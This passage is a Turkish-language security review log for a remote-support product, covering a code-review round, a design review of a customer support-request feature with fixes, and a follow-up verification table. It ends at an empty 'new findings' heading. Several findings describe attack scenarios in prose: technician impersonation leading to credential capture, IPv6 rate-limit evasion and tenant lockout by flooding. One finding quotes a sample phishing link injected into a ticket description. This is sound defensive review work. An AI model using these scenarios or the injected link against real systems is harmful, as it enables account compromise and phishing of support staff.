İstismar senaryosu: Geçmiş ekranını gören bir kullanıcı başka bir teknisyenin bekleyen kodunu okur ve müşteriden önce katılma isteği gönderir. Teknisyenin admit kodu kontrolü ve kod/IP sınırları devrede olduğu için etkisi düşük. Yine de gereksiz bir veri yüzeyi.
Düzeltme: `code` yalnız oturumun kendi teknisyenine dönsün (`r.technician.id === auth.user.id`), diğer durumlarda `null` olsun. Konsol yalnız kendi kodunu kullandığı için davranış değişmez. Atanan: backend-dev

#### S8-3 [DÜŞÜK] Liste ucunda hız sınırı yok; `customer` araması `%…%` ile tam tarama yapıyor (A04, kaynak tüketimi)
Yer: `apps/server/src/sessions/routes.ts:56`, `apps/server/src/sessions/history-repo.ts:43`
Sorun: Her istek `findMany` ve `count` çalıştırıyor. Baştaki `%` nedeniyle `customer_name` üzerinde indeks kullanılamıyor. SA "tümü" kapsamında bu tüm `support_sessions` tablosunun taranması demek. Export için 5/dk sınırı var, liste ucunda hiç yok. Uç kimlik doğrulama istediği için risk düşük.
Düzeltme: `customer` filtresi doluyken kullanıcı başına bir `FixedWindowCounter` eklenmeli (ör. 60/dk). Alternatif olarak P13 hacmine göre FULLTEXT/n-gram araması değerlendirilebilir. Atanan: backend-dev

#### S8-4 [DÜŞÜK] ADR-0014 precheck adımı runbook'ta yok (A05, işletim)
Yer: `apps/server/prisma/migrations/20261111070000_enum_check_binary/precheck.sql:1`, `docs/runbook.md` (`precheck` geçmiyor)
Sorun: Migration kendini koruyor: uyumsuz satır varsa 3819 hatasıyla hiçbir şey değiştirmeden duruyor. Bu yüzden veri bütünlüğü açısından fail-closed. Ancak yayın adımlarında precheck'in migrate'ten önce çalıştırılması yazılı değil. Dosyadaki "satırları elle DÜZELTMEYİN (KVKK kanıtı)" uyarısı da operatöre ulaşmıyor.
Düzeltme: Runbook'un yayın bölümüne precheck komutu ve "0 değilse mimara bildir" adımı eklenmeli. Atanan: devops

### İstenen kontrollerin sonucu
- **IDOR / kapsam (AC-61):** Liste, `:id`, `:id/history`, PATCH ve export'un hepsi `historyScope(auth)` kullanıyor (`service.ts:38-42`). `historyWhere` kapsamı filtreden sonra yazdığı için USER'ın gönderdiği `technicianId` etkisiz kalıyor (`history-repo.ts:37-39`, `resolveFilter` `history.ts:55,61`). Tenant kapsamında `tenantId` sorgu filtresi yok sayılıyor (`history.ts:62`, `history-repo.ts:35`). `{kind:"all"}` markalı bir tür. Onu yalnız tenantId'siz SUPER_ADMIN alıyor; diğer rollerde tenantId yoksa FORBIDDEN dönüyor (`service.ts:39-40`). PATCH'te kapsam UPDATE'in `where`'inde, count 0 ise 404 (`history-repo.ts:170-172`). Alt listelerde (onay, dosya, audit) filtre oturumun kendi `tenantId`'si (`history-repo.ts:134-163`). Kapsamın yanlışlıkla genişlemesine yol açan bir durum bulunmadı. "Tümü" kapsamı yalnız mimari-api §2'de sayılan 5 uçta geçerli; diğer uçlarda `tenantScope` değişmedi.
- **Yetki:** `GET ""` için `requireAnyPerm(sessions.view, session_history.view)`, `GET /:id` için `sessions.view`, `/:id/history` için `session_history.view`, PATCH için `session_history.edit`, export için `session_history.export` gerekiyor. `/export.csv` statik rota olduğu için `/:id`'den önce eşleşiyor, ayrıca `/:id` ULID regex'i istiyor. PATCH, `requireAuth` içinde Origin ve CSRF double-submit kontrolünden geçiyor (`guards.ts:9,48`).
- **LIKE enjeksiyonu:** `escapeLike` `\ % _` karakterlerini kaçışlıyor (`history-repo.ts:29`). Prisma 7'nin kaçışlamadığı entegrasyon testiyle doğrulanmış (`session-history-p8.test.ts:106-132`). `customer` alanı 2–100 karakter, Cc/Cf/bidi içeremiyor, strict şema.
- **PATCH girdisi:** `ticketNo` için `UNSAFE_NAME_CHARS`, trim ve ≤50 kontrolü var. `note` için CRLF→LF dönüşümü, tek `\r` yasağı, yalnız `\n\t` serbest, bidi/sıfır genişlikli karakter yasağı ve ≤4000 sınırı var. DB CHECK'leri zod'dan gevşek, yani zod'dan geçen bir değer CHECK'e takılmıyor. Şema strict ve en az bir alan istiyor.
- **Not metni audit/log'a düşmüyor:** `session.updated` yalnız `ticketNo` ve `noteLength` yazıyor (`history.ts:273-274`). Pino `maskUrl` sorgu dizesini atıyor, bu yüzden `customer` arama metni loga girmiyor. Export audit'i yalnız `customerFilter:boolean` tutuyor (`history.ts:337`).
- **`audit/mask.ts` `ticketNo`:** Anahtar tam eşleşmeyle izinli listeye alınmış. `wsTicket` ve diğer `ticket*` anahtarları maskeli kalıyor. Ticket numarası gizli bir değer değil. **Kabul edildi.**
- **Zaman çizelgesi sızıntısı:** `auditSelect` içinde `ip_address` ve `user_agent` yok. `details` yalnız `TIMELINE_DETAIL_KEYS` izin listesindeki alanları içeriyor, `***` değerleri dönmüyor, string'ler 200 karakterle kesiliyor (`history.ts:96-126`). Ham `old/new_value` dönmüyor.
- **KVKK / onay kayıtları:** `SessionConsentRecord` ip ve UA içermiyor. Yalnız düzey, karar, kaynak ve metin `{id, version, sha256}` dönüyor. E-posta ve not yalnız detayda var, listede yok.
- **CSV DoS:** Sıra şöyle: önce hız sınırı (`FixedWindowCounter(6,60s,60s)`, 6. istek 429), sonra count (>50.000 ise 400, yarım dosya üretilmiyor), sonra audit, sonra 1000'lik keyset partileriyle akış (`Readable.from` backpressure uyguluyor). `written` sayacı akış sırasında artan satırlarda da 50.000'de kesiyor. Yanıt başlıklarında `nosniff` ve `no-store` var, dosya adı sunucu tarafında üretiliyor.
- **admit:** Müşteri adı ve e-postası aynı atomik `consumeForAdmit` UPDATE'inde yazılıyor. `customerOf`, iki kod noktasından kısa adı NULL'a çeviriyor, böylece CHECK yüzünden admit düşmüyor. E-posta zod'da ≤190, kolon VARCHAR(190).
- **XSS:** History sayfalarında `dangerouslySetInnerHTML` ve `innerHTML` yok, kullanıcı verisi `href`'e girmiyor (yalnız ULID `/history/${id}`). Not, ticket, müşteri adı, actorName ve e-posta React metin düğümü olarak render ediliyor. CSV indirme fetch, blob ve `a.download` ile yapılıyor. Not formundaki "kaydedilmemiş değişiklik" yakalayıcısı yalnız aynı origin'e yönlendiriyor.
- **Go imleç ayrıştırma:** `PointerShape.Size()` için `W,H,Pitch ≥ 1` ve `len(Data) ≥ Pitch*H` kontrolleri var. Mono'da H çift ve `Pitch ≥ ⌈W/8⌉`, renkli türde `Pitch ≥ 4W` isteniyor, bilinmeyen tür reddediliyor. Tüm indekslerin sınırlar içinde kaldığını elle kontrol ettim: mono'da `(sy+sh)*Pitch+sx/8 < Pitch*H`, renkli türde `sy*Pitch+4sx+4 ≤ Pitch*H`. Yama `pw×ph` masaüstüne kırpılıyor (`x1=min(X+sw,dw)`), dolayısıyla büyük bir şekil büyük bellek ayırmasına yol açmıyor. `srcOffset` ve NV12 `cuv[x+1]` indeksleri, W/H çift olduğu ve `xe` çifte yuvarlandığı için sınır içinde. Tampon `PointerShapeBufferSize` kadar ayrılıyor ve yeniden kullanılıyor. Bellek taşması bulunmadı.

### Otomatik tarama / test çıktıları (2026-11-11)
- `pnpm audit --audit-level=moderate`: **No known vulnerabilities found**.
- `git diff HEAD --stat -- apps/agent-win/go.mod go.sum` boş, Go bağımlılığı değişmedi. Bu yüzden govulncheck gerekmedi.
- Gizli bilgi kalıbı (`git grep`) P8 dosyalarında eşleşme vermedi. İzlenmeyen `.env` yok.
- `pnpm --filter @remote/server test`: **13 dosya / 255 test** yeşil. `pnpm --filter @remote/contracts test`: **49 test** yeşil. Entegrasyon testleri (MySQL) bu turda koşulmadı.

### Tasarımda vaat edilip kodda bulunmayanlar
Yok. mimari-api "Oturum geçmişi (P8)" §1–5'teki kapsam, izin listesi, PATCH audit, CSV sırası ve sınırlarının hepsi kodda karşılığını buldu.

### Olumlu
- `AllTenantsScope` markalı bir tür. Tüm-tenant kapsamını başka bir modülün kendi başına kurması derleme zamanında engelleniyor.
- Not metni audit'e yazılmıyor. 730 günlük audit saklama süresiyle KVKK'daki "amaçla sınırlılık" ilkesi birlikte korunuyor.
- ADR-0014 ile enum CHECK'leri ikili (büyük/küçük harf duyarlı) karşılaştırma yapıyor. Örneğin `role='admin'` gibi bir değer artık DB'de reddediliyor. Migration uyumsuz satır bulursa kendini durduruyor.

### Öneri (`docs/gereksinimler.md` §9 "Sonra")
- S8-1..S8-4 (hepsi Düşük).

DURUM: GEÇTİ (Kritik 0 / Yüksek 0 / Orta 0 / Düşük 4)

---

## Tasarım turu — E9 (P8b) — Müşteri destek talebi (2026-11-12)
DURUM: DÜZELTİLMELİ
Özet: Kritik 0 / Yüksek 1 / Orta 6 / Düşük 7

Kapsam: `docs/mimari-e9.md` (§2–§8, T28–T38, §5.4), ADR-0016, ADR-0004 r3, ADR-0006 r4, `docs/mimari-api.md` "Destek talepleri (P8b)", `docs/mimari-protokol.md` §5, `docs/tasarim-kontrol.md` E9, `docs/gereksinimler-e9.md`, AC-129..164. Tasarımın "mevcut" dediği kontroller koddan doğrulandı (`signaling/ws.ts`, `admit.ts`, `store.ts`, `lib/{ip,logger}.ts`, `audit/mask.ts`, `auth/guards.ts`, `deploy/Caddyfile`, `deploy/nginx/remote.noktabilisim.net.conf`, `agent-win/internal/{config,pairing}`).

### Bulgular (öncelik sırasıyla)

#### G-E9-1 [YÜKSEK] Talep, makine ve kişi arasında bağ yok; "telefonla doğrulayın" önlemi tasarlandığı haliyle işlemiyor (A07/A04)
Yer: mimari-e9 §5.1, T29; ADR-0016 Karar 3; gereksinimler V16, R11
Sorun: Lobi ve admitCode kaldırıldı (V16). Bunun yerine konan tek önlem kılavuzdaki "tanımadığınız talebi telefonla doğrulayın" cümlesi. Ancak teknisyen ile müşteri arasında karşılaştırabilecekleri ortak bir değer yok. Telefon numarası da talebi açan kişiden geliyor. Talep sırrı yalnızca istemciyle sunucu arasında bir bağ kuruyor; ekran başındaki kişiyle istemci arasında bir bağ kurmuyor.
İstismar senaryosu: Firma bağlantısı müşteri firmanın bütün çalışanlarına dağıtılan, gizli olmayan bir bağlantı. Saldırgan dosyayı ele geçirir ve gerçek bir çalışanın adını, kendi telefon numarasını yazıp "Outlook açılmıyor" diye talep açar. Teknisyen formdaki numarayı arar ve saldırganla konuşur, ya da gerçek çalışanı arar ve "evet talep açtım" cevabını alır. İki durumda da hangi makineye bağlanacağını ayırt edemez. Saldırganın sanal makinesine bağlanır, kontrol sırasında yönetici veya domain şifresi yazar. Bu tuş vuruşları saldırganın makinesinde kaydedilir. Teknisyen müşteriden gelen dosyayı açarsa (AC-117) zararlı yazılım da alabilir.
Öneri (S12 kararını değiştirmez, akışa kapı eklemez):
(a) Sunucu talep oluştururken gösterim amaçlı 4–6 haneli bir `requestCode` üretir. Kod 201 yanıtında döner, istemcinin bekleme ekranında büyük puntoyla görünür ve panelde talep kartında yer alır. WhatsApp mesajına ve audit'e yazılmaz.
(b) Kılavuz ve panel ipucu şöyle düzeltilir: "Müşteriyi **firmanın kayıtlı numarasından** arayın (talepteki numaradan değil) ve ekrandaki talep kodunu sorun."
(c) Panel kartında "bu IP öneki/telefon bu tenant'ta daha önce oturum yaptı mı" bayrağı gösterilir.
(d) S12 tenant ayarı (admitCode) genişlemesi Sonra listesinde öne alınır.
Atanan: mimar (sözleşme: 201 + `SupportRequestItem.requestCode`), backend, frontend, istemci, teknik-yazar

#### G-E9-2 [ORTA] Teknisyen bağlanmadan ACTIVE olan talep odasında caps kaynağı ve "teknisyen yok" zamanlayıcısı tanımsız (A01)
Yer: protokol §5.2 adım 4–5; mevcut `signaling/admit.ts:76-80` (caps `tech.permissions`'tan, `TechConn` gerektirir)
Sorun: Talep akışında misafir, teknisyenden önce kabul edilip oturum ACTIVE olabiliyor. Mevcut kod caps değerini bağlı teknisyenin yetkilerinden hesaplıyor. Tasarım bu durumda caps'in nereden geleceğini ve teknisyen hiç bağlanmazsa odanın ne zaman kapanacağını belirtmiyor. Yanlış bir varsayılan (boş `tech` ya da tüm caps açık) `remote_control.use` veya `file_transfer.use` yetkisi olmayan bir kabulcüye bu yetenekleri verebilir. Ya da müşteri göstergesi açık halde, karşısında kimse olmadan max süre boyunca bekleyebilir.
Öneri:
- Admit anında caps, `technician_id` için DB'deki etkin yetkilerden hesaplanır (pasif kullanıcı ve rol kontrolü dahil).
- Mevcut 120 sn teknisyen kopma zamanlayıcısı admit anında başlatılır.
- Regresyon testi: `remote_control.use` yetkisi olmayan bir kabulcüde caps boş olmalı.
- `accept` yetkisinin `sessions.create` yetkisini kapsadığı bilgisi toggle ekranında açıklanır.
Atanan: mimar, backend

#### G-E9-3 [ORTA] Onayın tazeliği: ekran paylaşımı onaydan 120 dk sonra müşteri etkileşimi olmadan başlayabiliyor; iptalden sonra gelen kabul tanımsız (A04, KVKK)
Yer: AC-154, protokol §5.1 (`request.cancel` ACCEPTED iken yok sayılır), §5.2 adım 2 (`session_consents` talepteki IP ile yazılır)
Sorun: Onay talep anında alınıyor; paylaşım ise kabul anında kendiliğinden başlıyor. Müşteri bu arada masadan kalkmış ya da ekranında başka içerik açmış olabilir. Ayrıca müşteri "İptal"e bastıktan veya pencereyi kapattıktan sonra gelen `request.accepted` için istemcinin ne yapacağı tanımlı değil. `session_consents` kaydı da karışık kaynaklı: IP talepten, user-agent bağlantıdan geliyor.
Öneri:
- İstemci kabul geldiğinde teknisyen adı ve doğrulama koduyla 5 sn geri sayım ve odaklı "Vazgeç" butonu gösterir. Bekleme belirli bir eşiği (ör. 10 dk) aştıysa tek tık "Bağlan" ister. Bu kararı kullanıcı/mimar verir.
- İptal veya kapatma sonrasında gelen kabul yok sayılır ve `/ws/guest`'e bağlanılmaz.
- Onay kaydına `request_id` (ya da ayrı bir kaynak değeri) eklenir; `decided_at` talep zamanı olarak yazılır.
Atanan: mimar, istemci, backend

#### G-E9-4 [ORTA] Uzun ömürlü firma dosyası: eski ve açıklı istemci sürümleri sahada süresiz çalışır; asgari sürüm kapısı yok (A06/A08)
Yer: ADR-0006 r4, US-29 ("bir kez indirip saklamak"), mimari-api POST `/public/requests` (`clientVersion` yalnız kaydediliyor)
Sorun: Eski akışta her oturumda taze ikili indiriliyordu; firma dosyası ise aylarca masaüstünde kalır. "Teknisyenden kod aldım" yolu (AC-162) da aynı eski ikiliyle çalışır. Bir güvenlik yaması yayınlandığında eski ikilileri durdurmanın yolu yok.
Öneri:
- `MIN_AGENT_VERSION` tanımlanır (env veya contracts sabiti).
- POST `/public/requests`, `/public/sessions/resolve|join` (AGENT) ve `/ws/guest` (AGENT) için sürüm daha düşükse `CLIENT_OUTDATED` döner.
- İstemci bu durumda "Yeni sürümü indirin" der ve aynı `request-download` bağlantısını tarayıcıda açar.
- Runbook'a "güvenlik yamasında min sürümü yükselt" adımı eklenir.
Not: değer istemcinin kendi beyanı; zararlı istemciye karşı değil, dürüst kullanıcıyı eski ikiliden korumaya yönelik.
Atanan: mimar, backend, istemci, devops

#### G-E9-5 [ORTA] WhatsApp mesajına giden müşteri metni, güvenilen göndericiden teknisyene oltalama kanalı oluyor (A03, içerik enjeksiyonu)
Yer: mimari-e9 §6 şablonu; mimari-api `descriptionSchema` (`\n` serbest)
Sorun: Açıklamanın ilk 100 karakteri satır sonu ve URL içerebiliyor. WhatsApp URL'leri otomatik bağlantıya çevirir. Mesaj, teknisyenlerin güvendiği Nokta bildirim numarasından gelir. Saldırgan "Yazıcı çalışmıyor\nPanel: https://remote-noktabilisim.net/login" gibi bir açıklamayla sahte bir panel bağlantısı satırı üretebilir.
Öneri:
- WhatsApp'a giden ad ve açıklama tek satıra indirilir (`\s+` → boşluk).
- URL ve alan adı kalıpları etkisizleştirilir (`.`→`[.]`, `://`→`[:]//`) ya da açıklama hiç gönderilmez (bkz. G-E9-6).
- WhatsApp biçim karakterleri (`* _ ~ \``) kaçışlanır.
- Gerçek panel bağlantısı sabit bir etiketle ilk satıra konur.
- Panelde açıklama otomatik bağlantıya çevrilmez.
Atanan: backend, frontend

#### G-E9-6 [ORTA] whatsapp-bildirim servisi kimliksiz ve internete açık; kişisel veri düz HTTP ile ve yurt dışına gidiyor; K13 yalnız TLS'i kapsıyor (A02/A05, KVKK)
Yer: T33/T34, K13, §8 (`WHATSAPP_SERVICE_URL` vars. `http://89.252.189.211:3000`)
Sorun:
1. Servis kimlik doğrulaması istemiyor ve herkese açık. Herkes aynı numaradan teknisyenlere sahte "Yeni destek talebi + bağlantı" mesajı gönderebilir; gönderici numarasına duyulan güven boşa çıkar.
2. Mesajdaki ad, telefon ve açıklama Meta altyapısına, yani yurt dışına aktarılıyor (KVKK md. 9). Bu aktarım aydınlatma metninde yok.
3. Teknisyen telefonlarındaki kopyalar saklama ve anonimleştirme işinin (AC-159) dışında kalıyor.
4. Prod'da `http://` kullanımı yalnız bir uyarı logu üretiyor.
Öneri:
- K13 prod ön koşulu genişletilir: servis API anahtarı, güvenlik duvarında yalnız Remote sunucusuna izin, TLS ya da özel ağ. Prod'da `http://` ve özel olmayan adres verilirse kanal kapalı başlar (fail-closed).
- Varsayılan mesaj kişisel veri içermez: "[Firma] Yeni destek talebi — panelde görüntüleyin". Kişisel veri içeren şablon tenant seçeneği olur ve aydınlatma seed metnine WhatsApp/yurt dışı aktarım maddesi eklenir. Bu, AC-150 metninde değişiklik gerektirir.
- Gövde strict tutulur; `attachments` alanı hiç gönderilmez.
Atanan: mimar, devops, proje-yoneticisi (AC-150), kullanıcı (K13)

#### G-E9-7 [ORTA] IPv6 /56 önek kovası atlatılabiliyor; tenant kovası, 50 bekleyen sınırı ve WhatsApp çoğaltmasıyla tenant kalıcı olarak kapatılabiliyor, paylaşılan WhatsApp numarası engellenebiliyor (A04)
Yer: §5.4, K15, AC-143/144; `lib/ip.ts:26-33` (`prefixKey` IPv6 → /56, `ipKey` → /64)
Sorun:
- Ücretsiz bir /48 (ör. tünel sağlayıcısı) 256 adet /56 ve 65.536 adet /64 öneki verir. Bu, saatte 20 talep sınırını 256 katına çıkarır. Örnek başına 3 bekleyen sınırı ise /64 başına uygulandığı için pratikte işlevsiz kalır.
- 50 bekleyen talep, açık tutulan 50 `/ws/request` soketiyle 30–120 dk dolu kalır (QUEUE_FULL). Tenant kovası her 15 dk'da yeniden tetiklenebilir.
- Her talep 5 alıcıya gider: tenant başına saatte 300 WhatsApp mesajı. Bu, tüm Nokta projelerinin kullandığı numaranın spam nedeniyle engellenmesi riskini doğurur (R13).
- Ters yönde: kurumsal NAT arkasındaki bir ofis (US-29'un asıl kullanıcısı) IPv4 /32 başına saatte 5 talep ve 3 bekleyen sınırına kendi kendine takılır.
Öneri:
- IPv6 için ek /48 kovası eklenir.
- Tenant kovası aşıldığında bütün tenant kilitlenmez: yalnız son N günde bu tenant'ta görülmemiş kaynaklar reddedilir. Tenant Admin'e panel uyarısı ve tenant etiketli alarm gider.
- WhatsApp'a alıcı başına saatte 10 mesaj sınırı konur; fazlası "son 1 saatte N yeni talep" özeti olarak birleştirilir. Global WhatsApp hız sınırı da eklenir.
- NAT ölçüsü proje-yoneticisi ile gözden geçirilir.
Atanan: mimar, backend, proje-yoneticisi

#### G-E9-8 [DÜŞÜK] nginx erişim logu firma dosyası yolunu maskelemiyor (A09, G-10)
Yer: `deploy/nginx/remote.noktabilisim.net.conf:13-16` (yalnız `/downloads/Destek-`); mimari-e9 §8 yalnız Caddy filtresinden söz ediyor
Öneri: `remote_log_uri` map zincirine `/downloads/NoktaDestek-[^/]+` → `/downloads/NoktaDestek-***` eklenir; runbook §8.3 güncellenir. Atanan: devops

#### G-E9-9 [DÜŞÜK] Tasarımın "mevcut" dediği iki kontrol kodda yok
Yer: T31 "pino redaksiyon `*.requestSecret` (mevcut)": `lib/logger.ts:10-25` yalnız `*.secret` içeriyor; pino yolları tam anahtar adıyla eşleşir. T30 "IP başına eşzamanlı WS sınırı (mevcut 20)": `signaling/ws.ts:63-64` yalnız dakikada 31 upgrade sayıyor.
Öneri: `REDACT_PATHS`'e `*.requestSecret` ve `*.wsTicket` eklenir. Eşzamanlı WS sınırı ya eklenir ya da T30 metni düzeltilir (soket sayısını bekleyen sınırları zaten bağlıyor). Atanan: backend, mimar

#### G-E9-10 [DÜŞÜK] POST `/public/requests` adım sırası tutarsız; FOR UPDATE ilk okuma olmalı
Yer: mimari-api POST `/public/requests` ("hız (ip/önek/tenant) → zod → ref")
Sorun: Tenant kovası tenantId'yi gerektiriyor ama sırada ref çözümlemesinden önce geliyor. Ayrıca TX içinde FOR UPDATE'ten önce kilitsiz bir okuma yapılırsa InnoDB anlık görüntüsü erken oluşur ve bekleyen sayımı yarışla aşılabilir.
Öneri: Sıra şöyle olmalı: Origin → ip/önek → zod → ref (geçersizse `ref_invalid`) → tenant kovası → TX. TX'in ilk ifadesi `FOR UPDATE` olur. AC-143 "60 paralel → 50" testi bu sırayı korur. Atanan: backend

#### G-E9-11 [DÜŞÜK] Statik `/downloads/NoktaDestek-<label>-<ref>.exe` yolu label ve ref'i doğrulamıyor; firma penceresinde alan adı/sürüm satırı yok (A04)
Yer: ADR-0006 r4, §8 `@agentExe`, AC-133
Sorun: Resmi alan adında keyfi adlı bir dosya bağlantısı üretilebiliyor (ör. `NoktaDestek-Fatura2026-…`). İkili gerçek ve zararsız, ama bağlantı sosyal mühendislik için kullanılabilir.
Öneri: `forward_auth` ref ve label eşleşmesini iç uçta doğrular, ya da bu durum kabul edilen risk olarak runbook'a yazılır. Firma penceresi dosya adındaki label'ı değil, yalnız sunucudan gelen firma adını gösterir. P6 karşılamasıyla eşit olacak şekilde alan adı + sürüm satırı eklenir. Atanan: devops, istemci

#### G-E9-12 [DÜŞÜK] Ret mesajı URL ve telefon taşıyabiliyor (T38)
Öneri: `rejectMessageSchema` `://`, `www.` ve alan adı kalıplarını reddeder. UI'da hazır seçenekler varsayılan olur. Win32 statik metin `SS_NOPREFIX` ile çizilir (`&` önek sayılmasın). Atanan: backend, istemci

#### G-E9-13 [DÜŞÜK] Hatırlama: varsayılan işaretli kutucuk ve paylaşılan Windows hesabında başkasının bilgileriyle dolu gelen form (T36, V15)
Öneri: Form dolu açıldığında "Bu bilgiler size ait değilse: Bilgilerimi unut" ipucu gösterilir. Varsayılan işaretli kutucuğun KVKK açısından uygunluğu kullanıcı onayıyla kayda geçer. Önceki çalışmadan kalan `hatirla.bin.tmp` O_EXCL'i bozmasın diye dosya silinip bir kez yeniden denenir. Atanan: istemci, kullanıcı

#### G-E9-14 [DÜŞÜK] `/ws/panel` çıkış ve yetki kaldırmadan sonra 60 sn'ye kadar kişisel veri içeren bildirim almaya devam ediyor (T35)
Öneri: Logout, logout-all ve yetki toggle servisleri `hub.closeByUser/AuthToken` fonksiyonunu doğrudan çağırır (S-P3-8 kalıbı); 60 sn döngüsü yalnız yedek yol olarak kalır. Atanan: backend

### İstenen kontrollerin sonucu (bulgu yok)
- **Ref başka sunucuya yönlendirebilir mi:** Hayır. Sunucu URL'si yalnız ldflags ile gömülüyor (`internal/config/config.go:2`). Ref `[a-z2-7]{16}` biçiminde ve yalnız sorgu değeri olarak kullanılıyor. TLS doğrulaması mevcut.
- **Ticket ve sır:** Ticket yalnız sır sahibinin soketine itiliyor; tüketim tek kullanımlık (`store.ts` `take`). `/ws/guest` UPDATE'inde `AND request_id` koşulu var. Talep oturumunda `active_code` NULL; `token_hash` hiç döndürülmüyor; indirme yolunda `!row.activeCode` → 404 (`public/agent.ts`). Kod ve link yoluyla talep oturumuna katılınamıyor.
- **T28:** 80 bit ref ve ipKey başına 10/dk sınırıyla numaralandırma pratik değil. Tek 404 yolu yeterli. Önbellek geçersiz kılma, tenant pasife alındığında da çalışmalı (P9).
- **T33 SSRF:** URL yalnız env'den; alıcı E.164; şablon sunucuda. Ek bulgu yok (bkz. G-E9-6).
- **XSS/CSV:** React metin, Sonner düz metin, Cc/Cf/bidi reddi. CSV'de S8-1 düzeltmesi var (`lib/csv.ts:12`); telefon ve açıklama CSV'ye girmiyor.
- **P7 kapıları:** Protokol §5.2 adım 5'e göre değişmiyor. Kontrol izni ve kapı istemcide (ADR-0009). Caps konusu için bkz. G-E9-2.
- **Super Admin / tenant:** Firma seçimi zorunlu, `historyScope` istisnası yok, hub anahtarı soket bağlamından geliyor.
- **Audit kapsamı:** AC-160 olaylarının tamamı listede. Mask regex'i `keyType`'ı maskeler; tasarım bunu izinli listeye ekliyor, doğru. Tek not: `guest.admitted{via:"request"}` actor'ı `customer`/SYSTEM olmalı ve `acceptedBy` taşımalı.

### Otomatik tarama
Tasarım turu, yeni kod yok. Yeni ve değişen belgelerde gizli bilgi kalıbı (`git grep` regex'i) eşleşme vermedi. İzlenmeyen `.env` yok.

### Olumlu
- Talep sırrı 256 bit, hash'le saklanıyor, subprotocol'de taşınıyor; Caddy log filtresi `Sec-Websocket-Protocol`'ü siliyor.
- Kabul TX'i koşullu UPDATE ile tasarlanmış; yarış ve açık oturum sınırı testleri tanımlı.
- Tenant'a özel dosya aynı ikili; hash eşitliği CI testine bağlı (ADR-0010 korunuyor).
- DPAPI CurrentUser + LocalAppData; sır, açıklama ve ref dosyaya yazılmıyor.
- `/ws/panel` tek yönlü; kabul ve ret CSRF'li REST üzerinden.

### Öneri (`docs/gereksinimler.md` §9 "Sonra")
G-E9-8..14 (Düşük). G-E9-2..7 (Orta) P8b-1/P8b-2 içinde ele alınmalı veya gerekçesiyle "Sonra"ya yazılmalı. G-E9-1 (Yüksek) P8b-1 kodlamasından önce mimar revizyonuyla kapatılmalı.

DURUM: DÜZELTİLMELİ (Kritik 0 / Yüksek 1 / Orta 6 / Düşük 7)

---

## Tasarım turu 2 — E9 (P8b) — r2 doğrulaması (2026-11-12)
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 1 / Düşük 2 (yeni: G-E9-15..17). Tur 1'deki 14 bulgunun 14'ü KAPANDI.

Kapsam: `docs/mimari-e9.md` §13 (r2, bağlayıcı), ADR-0016 "Revizyon r2", `docs/mimari-api.md` "Destek talepleri (P8b)" (r2 satırları), `docs/mimari-protokol.md` §5, `docs/gereksinimler-kabul-kriterleri-e9.md` AC-146/150/154. Kodda henüz P8b yok. G-E9-14 için P9 çağıranlarının kodda olmadığı doğrulandı (`apps/server/src` içinde `switch-tenant` veya yetki PATCH ucu yok).

### Tur 1 bulgularının durumu
| ID | Durum | Dayanak / not |
|---|---|---|
| G-E9-1 [Y] | KAPANDI | §13.1: 6 haneli `requestCode` istemcide, panelde ve onay ekranında görünür. Kalıcı ipucu "firmanın kayıtlı numarasından arayın" AC-146'da. `knownSource` rozeti ve "İlk kez görülen kaynak" uyarısı var. S12 Sonra listesinin başına alındı. Kodun WhatsApp'a da yazılması tur 1 önerisinden sapma, ama zararsız: saldırgan kendi talebinin kodunu zaten görüyor, başka talebin kodu ona bir şey kazandırmıyor. Kalan risk usule bağlı: teknisyenin gerçekten kayıtlı numarayı araması. Kılavuzda ve eğitimde vurgulanmalı. "Bilinen ağ" sinyalinin zayıflığı için bkz. G-E9-15. |
| G-E9-2 [O] | KAPANDI | §13.2 ve protokol §5.2 adım 2/4: caps DB'deki etkin yetkiden hesaplanır, `TechConn` aranmaz. Pasif kullanıcı veya tenant → `auth_revoked`. Teknisyen yokken admit anında 120 sn zamanlayıcı başlar. `caps=[]` regresyon testi tanımlı. |
| G-E9-3 [O] | KAPANDI | §13.3 ve AC-154: onay her kabulde istenir, odak Vazgeç'te, butonlar 1,5 sn sonra etkinleşir, geri sayım yok. Yerel `CANCELLING` durumunda gelen kabul yok sayılır. ACCEPTED→CANCELLED tek decline yoluna bağlandı (WS, REST cancel ve close 1000). Onay kaydı bağlantı IP/UA'sı ve `request_id` ile yazılır. |
| G-E9-4 [O] | KAPANDI | §13.4: `MIN_AGENT_VERSION` → 426 `CLIENT_OUTDATED`. Kontrol talep, resolve, join ve `/ws/guest` yollarında; sürüm ticket'a taşınır. İstemci sabit biçimli URL'yi açar. Runbook adımı var. |
| G-E9-5 [O] | KAPANDI | §13.5: şablonda müşteri metni yok, firma adı temizleniyor, açıklama tek satır, panelde linkify yok. |
| G-E9-6 [O] | KAPANDI (tasarım) | Mesajda kişisel veri yok, `attachments` gönderilmiyor (strictObject), prod'da `http://` + açık adres → fail-closed. K13 prod ön koşulu (TLS veya özel ağ, güvenlik duvarında yalnız Remote) **usule bağlı**: P13 prod kontrol listesinde doğrulanmalı. Servis API anahtarı Sonra'da. |
| G-E9-7 [O] | KAPANDI | §13.6: /48 kovası; `net_key` başına 10 bekleyen; ≥ 40'ta yalnız bilinen kaynak kabul edilir; tenant kilitlenmez; güvenilen CIDR ile NAT ofisi muaf tutulur. Yeni doğan risk G-E9-15/16'da. |
| G-E9-8 [D] | KAPANDI | §13.7, nginx map + runbook §8.3 (devops P8b-1). |
| G-E9-9 [D] | KAPANDI | `REDACT_PATHS` += `requestSecret`, `wsTicket`, `deviceKey`. ipKey başına ≤ 5 `/ws/request`. T30 düzeltildi. |
| G-E9-10 [D] | KAPANDI | mimari-api sırası doğru: ref tenant kovasından önce, TX'in ilk ifadesi `FOR UPDATE`. |
| G-E9-11 [D] | KAPANDI | `agent-ready` label+ref doğruluyor. Pencere label'ı göstermiyor; sunucu/sürüm/SHA satırı var. |
| G-E9-12 [D] | KAPANDI | `rejectMessageSchema` URL, e-posta ve telefon kalıplarını reddediyor. Hazır seçenekler varsayılan. `SS_NOPREFIX` var. |
| G-E9-13 [D] | KAPANDI | Kutucuk varsayılan işaretsiz, "Bilgilerimi unut" ipucu var, tmp yeniden deneme var. |
| G-E9-14 [D] | KAPANDI | `closeByUser`/`closeByAuthToken` var. Logout, logout-all ve şifre değişimi P8b-1'de bağlanıyor. P9 çağıranları P9 giriş şartı (bu uçlar kodda henüz yok). |
| Audit notu | KAPANDI | `guest.admitted` actor `customer`, `{requestId, acceptedBy}`. |

### Yeni bulgular

